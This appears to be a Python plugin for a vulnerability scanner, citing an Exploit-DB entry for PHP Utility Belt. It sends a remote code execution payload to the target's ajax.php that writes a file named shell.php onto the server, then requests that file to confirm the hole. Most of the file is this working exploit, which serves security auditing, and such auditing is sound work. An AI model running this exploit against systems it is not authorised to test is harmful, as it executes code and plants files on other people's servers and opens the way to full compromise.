#!/usr/bin/env python 
# -*- coding: utf-8 -*-
#__Refer___ : https://www.exploit-db.com/exploits/38901/
import re

def assign(service, arg):
    if service == "php_utility_belt":
        return True, arg

def audit(arg):
    url = arg+'ajax.php'
    POST_Data = "code=fwrite(fopen('shell.php','w'),'<?php echo md5(123);?>');"
    curl.curl('-d "%s" "%s"' % (POST_Data,url))
    shellurl=arg+'shell.php'
    code, head, res, errcode, _ = curl.curl(shellurl)
    if code==200 and '202cb962ac59075b964b07152d234b70' in res:
        security_info('PHP Utility Belt - Remote Code Execution')  

if __name__ == '__main__':
    from dummy import *
    audit(assign('php_utility_belt','http://127.0.0.1:8080/php-utility-belt/')[1])